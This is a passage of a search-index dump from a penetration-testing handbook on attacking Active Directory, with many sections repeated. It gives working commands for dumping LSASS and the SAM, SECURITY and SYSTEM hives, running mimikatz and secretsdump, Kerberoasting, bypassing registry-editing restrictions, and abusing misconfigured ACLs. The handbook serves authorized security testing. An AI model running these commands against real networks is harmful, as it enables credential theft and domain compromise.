system hive, needs to be provided in order to extract the DCC2 credentials. python secretsdump.py LOCAL -security security.save -system system.save The DCC2 credentials are not as fast and easy to crack as NT-hashes, but with the right password-list it can be done.","title":"Domain Cached Credentials / DCC2 / MSCASH"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/credential_extraction/#lsa-secrets","text":"LSA secrets is an area in the registry, under Security that contains different kinds of interesting secrets. The data is used by Local System Authority, which is why it is called LSA Secrets. Only the SYSTEM user can access the registry. HKEY_LOCAL_MACHINE/Security/Policy/Secrets So what are these secrets? $MACHINE.ACC - Machine account password - Can be used as any other domain account DefaultPassword - If AutoLogon is enabled a password in cleartext can be found. NL$KM ?? When services are run under the context of a local or domain user the credentials for that user is stored in Secrets .","title":"LSA Secrets"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/credential_extraction/#extracting-credentials-from-the-lsass-process","text":"Sometimes it is not desirable to use Mimikatz on the target machine, because mimikatz is flagged as malware by most antivirus. There are however other ways to solve the problem, using only windows tools. Living of the land. One way is to dump the lsass process. There are a few ways to do this, one is by using the Task Manager GUI, and the other is by using procdump.exe from sysinternals. Procdump is beneficial if you only have command line access, no gui. Dump using Task manager The GUI way: Open task manager as administrator, rightclick on lsass and click on \"Create dump file\". Transfer the dump-file to an offline windows machine with Mimikatz on it. Dump using procdump.exe If you don't want to download procdump.exe to the victim computer you can host it on another share and then mount the share, and run it from there. It is seldom allowed to mount shares without authentication. net use k: \\\\10.10.11.11\\bbb /user:username password procdump.exe -accepteula -ma lsass.exe lsass.dmp","title":"Extracting credentials from the LSASS process"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/credential_extraction/#mimikatzpypykatz","text":"Run mimikatz on your offline windows machine token::elevate privilege::debug sekurlsa::minidump lsass.DMP sekurlsa::logonPasswords full pypykatz lsa minidump lsass.DMP","title":"Mimikatz/Pypykatz"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/credential_extraction/#extract-credentials-from-sam-and-security-hives-from-registry","text":"The other way to do it is simply to download the SAM, SYSTEM and SECURITY files from the compromised host. Transfer those files to your offline windows machine with Mimikatz on it, or simply use secretsdump.py. If the machine is running you need to dump the SAM and SYSTEM from the registry. C:\\> reg.exe save hklm\\sam c:\\temp\\sam.save C:\\> reg.exe save hklm\\security c:\\temp\\security.save C:\\> reg.exe save hklm\\system c:\\temp\\system.save python secretsdump.py LOCAL -sam ~/Documents/credsdump/sam.save -security ~/Documents/credsdump/security.save -system ~/Documents/credsdump/system.save See the cracking chapter for instructions on how to crack these hashes.","title":"Extract credentials from SAM and SECURITY hives from registry"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/credential_extraction/#bypassing-restrictions","text":"If you encounter a error such as the following ERROR Registry editing has been disabled by your administrator you will need to bypass it. # First verify the current setting Get-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name DisableRegistryTools # Change the setting to disable Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name DisableRegistryTools -Value 0 Some other techniques are found here: https://www.online-tech-tips.com/windows-xp/registry-disabled-by-administrator/","title":"Bypassing restrictions"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/credential_extraction/#extract-credentials-from-sam-and-security-hives-from-disk","text":"If you have physical access to the machine and it does not use BitLocker you can just boot up the computer with a live linux and then mount the windows disk. # if the below command shows \"Microsoft basic data\" or nothing then it is likely that the partition is encrypted, and you can just forget about it and move on. blkid lsblk -f # if the disk is ntfs or vfat you can mount it like this. Read only. mount -t ntfs-3g -o ro /dev/sda3 /mnt/something mount -t vfat -o ro /dev/sda3 /mnt/something","title":"Extract credentials from SAM and SECURITY hives from disk"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/execssive_amount_of_domain_admins/","text":"Active directory - Excessive amount of domain admins # Description # Recommendation # How to test for # Domain admins can be counted in several different ways. For example between enabled and disabled users. Or by including users who are admins through inheretance of group memberships. Within Active Directory, there are three built-in groups that comprise the highest privilege groups in the directory: the Enterprise Admins (EA) group, the Domain Admins (DA) group, and the built-in Administrators (BA) group. There are many more groups that can be sensitive. You can read about those here: https://adsecurity.org/?p=3700. But we will only list users of these three groups. This is kind of a bare minimum test. Therefore we will check who are members in these groups. If the query is run in Neo4j it can be exported using MATCH p=(n:User )-[r:MemberOf]->(m:Group {name : \"ADMINISTRATORS@domain.local\"}) RETURN n.displayname, n.name,n.description,n.lastlogontimestamp,n.enabled,m.name; MATCH p=(n:User )-[r:MemberOf]->(m:Group {name : \"DOMAIN ADMINS@domain.local\"}) RETURN n.displayname, n.name,n.description,n.lastlogontimestamp,n.enabled,m.name; MATCH p=(n:User )-[r:MemberOf]->(m:Group {name : \"ENTERPRISE ADMINS@domain.local\"}) RETURN n.displayname, n.name,n.description,n.lastlogontimestamp,n.enabled,m.name; The query can then be run executed like this, but of course with the correct domain name cat query.txt | /usr/share/neo4j/bin/cypher-shell --non-interactive -u neo4j -p PASSWORD --format plain > file.csv This will check for all objects that are members of the Domain admins group. This will include other groups and computers. MATCH (n:Group) WHERE n.objectsid =~ \"(?i)S-1-5-.*-512\" WITH n MATCH p=(n)<-[r:MemberOf]-(m) RETURN p","title":"Excessive Amount of Domain Admins"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/execssive_amount_of_domain_admins/#active-directory-excessive-amount-of-domain-admins","text":"","title":"Active directory - Excessive amount of domain admins"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/execssive_amount_of_domain_admins/#description","text":"","title":"Description"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/execssive_amount_of_domain_admins/#recommendation","text":"","title":"Recommendation"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/execssive_amount_of_domain_admins/#how-to-test-for","text":"Domain admins can be counted in several different ways. For example between enabled and disabled users. Or by including users who are admins through inheretance of group memberships. Within Active Directory, there are three built-in groups that comprise the highest privilege groups in the directory: the Enterprise Admins (EA) group, the Domain Admins (DA) group, and the built-in Administrators (BA) group. There are many more groups that can be sensitive. You can read about those here: https://adsecurity.org/?p=3700. But we will only list users of these three groups. This is kind of a bare minimum test. Therefore we will check who are members in these groups. If the query is run in Neo4j it can be exported using MATCH p=(n:User )-[r:MemberOf]->(m:Group {name : \"ADMINISTRATORS@domain.local\"}) RETURN n.displayname, n.name,n.description,n.lastlogontimestamp,n.enabled,m.name; MATCH p=(n:User )-[r:MemberOf]->(m:Group {name : \"DOMAIN ADMINS@domain.local\"}) RETURN n.displayname, n.name,n.description,n.lastlogontimestamp,n.enabled,m.name; MATCH p=(n:User )-[r:MemberOf]->(m:Group {name : \"ENTERPRISE ADMINS@domain.local\"}) RETURN n.displayname, n.name,n.description,n.lastlogontimestamp,n.enabled,m.name; The query can then be run executed like this, but of course with the correct domain name cat query.txt | /usr/share/neo4j/bin/cypher-shell --non-interactive -u neo4j -p PASSWORD --format plain > file.csv This will check for all objects that are members of the Domain admins group. This will include other groups and computers. MATCH (n:Group) WHERE n.objectsid =~ \"(?i)S-1-5-.*-512\" WITH n MATCH p=(n)<-[r:MemberOf]-(m) RETURN p","title":"How to test for"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/incorrectly_configured_forest_or_domain_trust/","text":"Incorrectly configured Forest - or Domain trust # A forest consists of two or more domains. The domain can have trust between each other. This means that a security principal (a user for example) can access a resource on the other domain. This might be intended. Previously the forest was viewed as a security boundry. So even though there was bi-directional trust between forests (so called inter -forest trust) it was not possible for admins in one forest to take over domain controllers in the other forests. Since the \"printer-bug\" (MS-RPRN) was discovered by Lee Christensen in 2018 this is not longer the case. This mean that if your organisation has a bi-directional trust with another forest, and that forest gets compromised, it is possible for an attacker to compromise your forest as well. Type of trust / Direction of trust # The AD can have specific trust types. The types of trusts are the following: Parent/Child - Cross-link External Tree-root Forest MIT Using Bloodhound # If there is trust between domains in a forrest, it might be that a user is allowed to retrevie You can just click on the default query \"Map domain trusts\" MATCH p=(n:Domain)-->(m:Domain) RETURN p How to test for it # You can identify what types of trusts you have by running the following commands: Get-NetForestDomain Get-NetDomainTrust Get-ADObject -SearchBase \"cn=system,dc=evilcorp,dc=se\" -Filter * -Properties trustType | where {$_.objectClass \u2013eq \"trustedDomain\"} | select Name,trustType Attacking domain trusts # https://posts.specterops.io/not-a-security-boundary-breaking-forest-trusts-cd125829518d?gi=43aabaf65628 Microsofts advistory https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/ADV190006","title":"Incorrectly Configured Forest or Domain Trust"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/incorrectly_configured_forest_or_domain_trust/#incorrectly-configured-forest-or-domain-trust","text":"A forest consists of two or more domains. The domain can have trust between each other. This means that a security principal (a user for example) can access a resource on the other domain. This might be intended. Previously the forest was viewed as a security boundry. So even though there was bi-directional trust between forests (so called inter -forest trust) it was not possible for admins in one forest to take over domain controllers in the other forests. Since the \"printer-bug\" (MS-RPRN) was discovered by Lee Christensen in 2018 this is not longer the case. This mean that if your organisation has a bi-directional trust with another forest, and that forest gets compromised, it is possible for an attacker to compromise your forest as well.","title":"Incorrectly configured Forest - or Domain trust"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/incorrectly_configured_forest_or_domain_trust/#type-of-trust-direction-of-trust","text":"The AD can have specific trust types. The types of trusts are the following: Parent/Child - Cross-link External Tree-root Forest MIT","title":"Type of trust / Direction of trust"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/incorrectly_configured_forest_or_domain_trust/#using-bloodhound","text":"If there is trust between domains in a forrest, it might be that a user is allowed to retrevie You can just click on the default query \"Map domain trusts\" MATCH p=(n:Domain)-->(m:Domain) RETURN p","title":"Using Bloodhound"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/incorrectly_configured_forest_or_domain_trust/#how-to-test-for-it","text":"You can identify what types of trusts you have by running the following commands: Get-NetForestDomain Get-NetDomainTrust Get-ADObject -SearchBase \"cn=system,dc=evilcorp,dc=se\" -Filter * -Properties trustType | where {$_.objectClass \u2013eq \"trustedDomain\"} | select Name,trustType","title":"How to test for it"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/incorrectly_configured_forest_or_domain_trust/#attacking-domain-trusts","text":"https://posts.specterops.io/not-a-security-boundary-breaking-forest-trusts-cd125829518d?gi=43aabaf65628 Microsofts advistory https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/ADV190006","title":"Attacking domain trusts"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/kerberoasting/","text":"Kerberos TGS Service Ticket Cracking (Kerberoast) # Kerberoast attack was presented 2014 by Tim at Sans HackFest. This is a easy and stealthy attack that is great to get started with. Background and terminology # SPN - Service Principal Name \"A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. This allows a client application to request that the service authenticate an account even if the client does not have the account name.\" SPN is an identifier for a particular service offered by a particular host. The common form for a SPN is the following format: service class/fqdn@REALM . So for an example: IMAP/mail.example.com@EXAMPLE.COM . So this is the identifier. Service Principal Name (SPN) is used in the domain to associate the service with a login account. So a SPN is associated with a domain login account. So an account is running the service. The service account runs the service. The service account is usually a Administrator, or belongs to admin group, or the machine. Which is good for an attacker. A user wants to interact with a service User sends a request to DC DC responds with TGT User sends TGS request to DC DC sends inter-realm TGT User sends TGS request to DC DC responds with TGS for the specified server. It is encrypted with the servers hash. User sends TGS to server. The server can decrypt the TGS because it is encrypted with a hash that the server knows. This means that everytime a user tried to access a specific servicer, for example by going to a share, the user recieves a TGS. The user can then offline crack the TGS to find the servers password. An attacker can do this even if the attacker does not have access to the service. You can see all the TGS-tickets that is on a computer by simply running this command: klist You will not see the actual TGS, as it is stored in memory. So the OLD-SCHOOL attack scenario was: Request access to all services on the domain Extact the TGS from memory Crack the TGS This was simplified. but some stuff that manages to remove the mimikatz part. No need to actually retrieve the TGS from memory, as it can be retrieved straight from the request. klist Offline brute force of passwords of service accounts with service tickets - No risk of detection - No account lockouts How to test # Using impacket: python GetUserSPNs.py -dc-ip 192.168.66.87 -request hackdomain.local/FilipAdmin The resulting hashes are already in hashcat format. Using invoke-kerberoast from PowerView: Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath \u2018c:\\users\\public\\HashCapture.txt\u2019 -Width 8000 Crack the hashes # Remember to add some words that are specific to the domain. Maybe company name and stuff like that. Look at the services that are running. See the chapter on cracking hashes for how to crack the hashes. Generate passwordlist # See the chapter on Generate password list for how to generate custom password lists. Brute force # If you want to do a brute force attack it is a good idea to first understand the AD password requirements. You can check the minimum pasword length by running this command: net accounts /domain net accounts References https://room362.com/post/2016/kerberoast-pt2/ https://room362.com/post/2016/kerberoast-pt1/","title":"Kerberos TGS Service Ticket Cracking (Kerberoast)"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/kerberoasting/#kerberos-tgs-service-ticket-cracking-kerberoast","text":"Kerberoast attack was presented 2014 by Tim at Sans HackFest. This is a easy and stealthy attack that is great to get started with.","title":"Kerberos TGS Service Ticket Cracking (Kerberoast)"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/kerberoasting/#background-and-terminology","text":"SPN - Service Principal Name \"A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. This allows a client application to request that the service authenticate an account even if the client does not have the account name.\" SPN is an identifier for a particular service offered by a particular host. The common form for a SPN is the following format: service class/fqdn@REALM . So for an example: IMAP/mail.example.com@EXAMPLE.COM . So this is the identifier. Service Principal Name (SPN) is used in the domain to associate the service with a login account. So a SPN is associated with a domain login account. So an account is running the service. The service account runs the service. The service account is usually a Administrator, or belongs to admin group, or the machine. Which is good for an attacker. A user wants to interact with a service User sends a request to DC DC responds with TGT User sends TGS request to DC DC sends inter-realm TGT User sends TGS request to DC DC responds with TGS for the specified server. It is encrypted with the servers hash. User sends TGS to server. The server can decrypt the TGS because it is encrypted with a hash that the server knows. This means that everytime a user tried to access a specific servicer, for example by going to a share, the user recieves a TGS. The user can then offline crack the TGS to find the servers password. An attacker can do this even if the attacker does not have access to the service. You can see all the TGS-tickets that is on a computer by simply running this command: klist You will not see the actual TGS, as it is stored in memory. So the OLD-SCHOOL attack scenario was: Request access to all services on the domain Extact the TGS from memory Crack the TGS This was simplified. but some stuff that manages to remove the mimikatz part. No need to actually retrieve the TGS from memory, as it can be retrieved straight from the request. klist Offline brute force of passwords of service accounts with service tickets - No risk of detection - No account lockouts","title":"Background and terminology"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/kerberoasting/#how-to-test","text":"Using impacket: python GetUserSPNs.py -dc-ip 192.168.66.87 -request hackdomain.local/FilipAdmin The resulting hashes are already in hashcat format. Using invoke-kerberoast from PowerView: Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath \u2018c:\\users\\public\\HashCapture.txt\u2019 -Width 8000","title":"How to test"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/kerberoasting/#crack-the-hashes","text":"Remember to add some words that are specific to the domain. Maybe company name and stuff like that. Look at the services that are running. See the chapter on cracking hashes for how to crack the hashes.","title":"Crack the hashes"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/kerberoasting/#generate-passwordlist","text":"See the chapter on Generate password list for how to generate custom password lists.","title":"Generate passwordlist"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/kerberoasting/#brute-force","text":"If you want to do a brute force attack it is a good idea to first understand the AD password requirements. You can check the minimum pasword length by running this command: net accounts /domain net accounts References https://room362.com/post/2016/kerberoast-pt2/ https://room362.com/post/2016/kerberoast-pt1/","title":"Brute force"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/misconfigured_access_control_lists/","text":"Background # Security Principal : Securable objects are AD entries that can have a Security Descriptor, such as: Users , Groups and Computers . Security Descriptor : A list of all Access Control Entries of that object. The Security Descriptor is just an LDAP attribute. Access Control Entry : A specification of WHO can do WHAT to a specific Securable Object. These permissions defined by the ACE can be seen if you go to any Securable Object (User, Group, or Computer) in Active Directory Users and Computers , such as the group \"Domain Admins\", or any user, and right-click and go to \"Properties\", and the click on \"Security\" and then on \"Permissions\". As mentioned above, the ACE is specified in the attribute nTSecurityDescriptor , which is the type NTSecurityDescriptor . However, reading the value from that attribute is no easy, ADExplorer parses it like shown below. The only thing that makes any sense here are the SIDs. This is how ADExplorer shows an ACE: D:AI(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;;RS)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;;RS)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;;RS)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;;RS)(OA;;RPWP;bf967a7f-0de6-11d0-a285-00aa003049e2;;CA)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;RPWP;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;RPWP;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561) There are two types of Access Control Lists: Discrectionary Access Control List (DACL) System Access Control List (SACL) The interface for delegating control (creating ACE) in AD is not very clear. Delegation of control is usually performed by right-clicking on a OU and the click on Delegate Control , and then follow the wizard and add users/group/computer and specify which type of permission/control that securable object should have. In order to view the changes you first have to go to ADUC/View/Advanced Features , after that you will be able to right-click on a OU, select properties and then look at the Security tab, to see you delegated control changes. However, if you click on the actual securable object, such as a user, you will not see your changes, only if you click on TheUser/Security/Advanced/Effective Access/SelectUser . As you can see, it is easy to delegate control and then forget about it. What we are looking for is security principals that have some kind of interesting ACE on a high priviliged securable object. There are a ton of different ACEs, but only a handful are interesting from an attackers perspective. An ACE that allows the attacking user to compromise the victim user are what we are looking for. The following ACEs can do that: GenericAll - full rights to the object (add users to a group or reset user's password) GenericWrite - update object's attributes (i.e logon script) WriteOwner - change object owner to attacker controlled user take over the object WriteDACL - modify object's ACEs and give attacker full control right over the object AllExtendedRights - ability to add user to a group or reset password ForceChangePassword - ability to change user's password Self (Self-Membership) - ability to add yourself to a group Pre-requisites # Risks # How to check for # These two queries can be helpful to enumerate attackpaths from any user that is not Domain Admin to become domain admin. These queries have excluded the sessions edge since that is reported in another issue. Remember to change the domain to your domain. MATCH (n:User {admincount: false}),(m:Group {name:\"DOMAIN ADMINS@MYDOMAIN.local\"}),p=shortestPath((n)-[r:MemberOf|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(m)) RETURN p MATCH (n:User {admincount: false}),(m:Group {name:\"DOMAIN ADMINS@MYDOMAIN.local\"}),p=allshortestPaths((n)-[r:MemberOf|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(m)) RETURN p To find users with DCSync permissions run this. Note that this query is the default query in Bloodhound which is called \"Find Principals with DCSync Rights\". MATCH (n1)-[:MemberOf|GetChanges*1..]->(u:Domain {name: \"MYDOMAIN.local\"}) WITH n1,u MATCH (n1)-[:MemberOf|GetChangesAll*1..]->(u) WITH n1,u MATCH p = (n1)-[:MemberOf|GetChanges|GetChangesAll*1..]->(u) RETURN p Find interesting privileges/ACEs that have been configured to DOMAIN USERS group: MATCH (m:Group) WHERE m.name =~ 'DOMAIN USERS@.*' MATCH p=(m)-[r:MemberOf|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin|ReadGMSAPassword|HasSIDHistory|CanPSRemote]->(n:Computer) RETURN p Find interesting edges related to \"ACL Abuse\" that uprivileged users have against other users: MATCH (n:User {admincount:False}) MATCH (m:User) WHERE NOT m.name = n.name MATCH p=allShortestPaths((n)-[r:AllExtendedRights|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner*1..]->(m)) RETURN p Find interesting edges related to \"ACL Abuse\" that unprivileged users have against computers: MATCH (n:User {admincount:False}) MATCH p=allShortestPaths((n)-[r:AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|AdminTo|CanRDP|ExecuteDCOM|ForceChangePassword*1..]->(m:Computer)) RETURN p Find interesting edges related to \"ACL Abuse\" that unprivileged users have against Groups: MATCH (n:User {admincount:False}) MATCH p=allShortestPaths((n)-[r:AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|AdminTo|CanRDP|ExecuteDCOM|ForceChangePassword*1..]->(m:Group)) RETURN p Find all Edges that a specific user has against all the nodes (HasSession is not calculated, as it is an edge that comes from computer to user, not from user to computer): MATCH (n:User) WHERE n.name =~ 'HELPDESK@DOMAIN.GR'MATCH (m) WHERE NOT m.name = n.name MATCH p=allShortestPaths((n)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(m)) RETURN p Find if unprivileged users have rights to add members into groups: MATCH (n:User {admincount:False}) MATCH p=allShortestPaths((n)-[r:AddMember*1..]->(m:Group)) RETURN p How to exploit # The commands are all from Powersploits PowerView module. ForceChangePassword: The ability to change the target user\u2019s password without knowing the current value. Abused with Set-DomainUserPassword . AddMembers: The ability to add arbitrary users, groups or computers to the target group. Abused with Add-DomainGroupMember . GenericAll: Full object control, including the ability to add other principals to a group, change a user password without knowing its current value, register an SPN with a user object, etc. Abused with Set-DomainUserPassword or Add-DomainGroupMember . GenericWrite: The ability to update any non-protected target object parameter value. For example, update the \"scriptPath\" parameter value on a target user object to cause that user to run your specified executable/commands the next time that user logs on. Abused with Set-DomainObject . WriteOwner: The ability to update the owner of the target object. Once the object owner has been changed to a principal the attacker controls, the attacker may manipulate the object any way they see fit. Abused with Set-DomainObjectOwner. WriteDACL: The ability to write a new ACE to the target object\u2019s DACL. For example, an attacker may write a new ACE to the target object DACL giving the attacker \"full control\" of the target object. Abused with Add-NewADObjectAccessControlEntry . AllExtendedRights: The ability to perform any action associated with extended Active Directory rights against the object. For example, adding principals to a group and force changing a target user\u2019s password are both examples of extended rights. Abused with Set-DomainUserPassword or Add-DomainGroupMember . Recommendation # References #","title":"Misconfigured Access Control Lists"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/misconfigured_access_control_lists/#background","text":"Security Principal : Securable objects are AD entries that can have a Security Descriptor, such as: Users , Groups and Computers . Security Descriptor : A list of all Access Control Entries of that object. The Security Descriptor is just an LDAP attribute. Access Control Entry : A specification of WHO can do WHAT to a specific Securable Object. These permissions defined by the ACE can be seen if you go to any Securable Object (User, Group, or Computer) in Active Directory Users and Computers , such as the group \"Domain Admins\", or any user, and right-click and go to \"Properties\", and the click on \"Security\" and then on \"Permissions\". As mentioned above, the ACE is specified in the attribute nTSecurityDescriptor , which is the type NTSecurityDescriptor . However, reading the value from that attribute is no easy, ADExplorer parses it like shown below. The only thing that makes any sense here are the SIDs. This is how ADExplorer shows an ACE: D:AI(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;;RS)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;;RS)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;;RS)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;;RS)(OA;;RPWP;bf967a7f-0de6-11d0-a285-00aa003049e2;;CA)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;RPWP;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;RPWP;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561) There are two types of Access Control Lists: Discrectionary Access Control List (DACL) System Access Control List (SACL) The interface for delegating control (creating ACE) in AD is not very clear. Delegation of control is usually performed by right-clicking on a OU and the click on Delegate Control , and then follow the wizard and add users/group/computer and specify which type of permission/control that securable object should have. In order to view the changes you first have to go to ADUC/View/Advanced Features , after that you will be able to right-click on a OU, select properties and then look at the Security tab, to see you delegated control changes. However, if you click on the actual securable object, such as a user, you will not see your changes, only if you click on TheUser/Security/Advanced/Effective Access/SelectUser . As you can see, it is easy to delegate control and then forget about it. What we are looking for is security principals that have some kind of interesting ACE on a high priviliged securable object. There are a ton of different ACEs, but only a handful are interesting from an attackers perspective. An ACE that allows the attacking user to compromise the victim user are what we are looking for. The following ACEs can do that: GenericAll - full rights to the object (add users to a group or reset user's password) GenericWrite - update object's attributes (i.e logon script) WriteOwner - change object owner to attacker controlled user take over the object WriteDACL - modify object's ACEs and give attacker full control right over the object AllExtendedRights - ability to add user to a group or reset password ForceChangePassword - ability to change user's password Self (Self-Membership) - ability to add yourself to a group","title":"Background"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/misconfigured_access_control_lists/#pre-requisites","text":"","title":"Pre-requisites"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/misconfigured_access_control_lists/#risks","text":"","title":"Risks"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/misconfigured_access_control_lists/#how-to-check-for","text":"These two queries can be helpful to enumerate attackpaths from any user that is not Domain Admin to become domain admin. These queries have excluded the sessions edge since that is reported in another issue. Remember to change the domain to your domain. MATCH (n:User {admincount: false}),(m:Group {name:\"DOMAIN ADMINS@MYDOMAIN.local\"}),p=shortestPath((n)-[r:MemberOf|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(m)) RETURN p MATCH (n:User {admincount: false}),(m:Group {name:\"DOMAIN ADMINS@MYDOMAIN.local\"}),p=allshortestPaths((n)-[r:MemberOf|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(m)) RETURN p To find users with DCSync permissions run this. Note that this query is the default query in Bloodhound which is called \"Find Principals with DCSync Rights\". MATCH (n1)-[:MemberOf|GetChanges*1..]->(u:Domain {name: \"MYDOMAIN.local\"}) WITH n1,u MATCH (n1)-[:MemberOf|GetChangesAll*1..]->(u) WITH n1,u MATCH p = (n1)-[:MemberOf|GetChanges|GetChangesAll*1..]->(u) RETURN p Find interesting privileges/ACEs that have been configured to DOMAIN USERS group: MATCH (m:Group) WHERE m.name =~ 'DOMAIN USERS@.*' MATCH p=(m)-[r:MemberOf|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin|ReadGMSAPassword|HasSIDHistory|CanPSRemote]->(n:Computer) RETURN p Find interesting edges related to \"ACL Abuse\" that uprivileged users have against other users: MATCH (n:User {admincount:False}) MATCH (m:User) WHERE NOT m.name = n.name MATCH p=allShortestPaths((n)-[r:AllExtendedRights|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner*1..]->(m)) RETURN p Find interesting edges related to \"ACL Abuse\" that unprivileged users have against computers: MATCH (n:User {admincount:False}) MATCH p=allShortestPaths((n)-[r:AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|AdminTo|CanRDP|ExecuteDCOM|ForceChangePassword*1..]->(m:Computer)) RETURN p Find interesting edges related to \"ACL Abuse\" that unprivileged users have against Groups: MATCH (n:User {admincount:False}) MATCH p=allShortestPaths((n)-[r:AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|AdminTo|CanRDP|ExecuteDCOM|ForceChangePassword*1..]->(m:Group)) RETURN p Find all Edges that a specific user has against all the nodes (HasSession is not calculated, as it is an edge that comes from computer to user, not from user to computer): MATCH (n:User) WHERE n.name =~ 'HELPDESK@DOMAIN.GR'MATCH (m) WHERE NOT m.name = n.name MATCH p=allShortestPaths((n)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(m)) RETURN p Find if unprivileged users have rights to add members into groups: MATCH (n:User {admincount:False}) MATCH p=allShortestPaths((n)-[r:AddMember*1..]->(m:Group)) RETURN p","title":"How to check for"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/misconfigured_access_control_lists/#how-to-exploit","text":"The commands are all from Powersploits PowerView module. ForceChangePassword: The ability to change the target user\u2019s password without knowing the current value. Abused with Set-DomainUserPassword . AddMembers: The ability to add arbitrary users, groups or computers to the target group. Abused with Add-DomainGroupMember . GenericAll: Full object control, including the ability to add other principals to a group, change a user password without knowing its current value, register an SPN with a user object, etc. Abused with Set-DomainUserPassword or Add-DomainGroupMember . GenericWrite: The ability to update any non-protected target object 